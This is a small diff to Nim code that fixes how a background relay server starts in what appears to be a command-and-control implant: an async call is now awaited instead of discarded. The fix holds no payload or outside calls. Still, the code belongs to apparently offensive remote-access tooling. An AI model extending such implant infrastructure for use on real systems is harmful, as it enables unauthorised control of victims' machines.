@@ -18,7 +18,8 @@ proc runRelayServerInBackground(port: int, implantGuid: string) =
     when defined debug:
         echo "[RELAY] 🔧 Background thread starting relay server on port " & $port
     try:
-        discard startHttpRelayServer(port, implantGuid)
+        # startRelayServer is async, need to wait for it
+        waitFor http_relay.startRelayServer(port, implantGuid)
     except Exception as e:
         when defined debug:
             echo "[RELAY] ❌ Background relay server crashed: " & e.msg
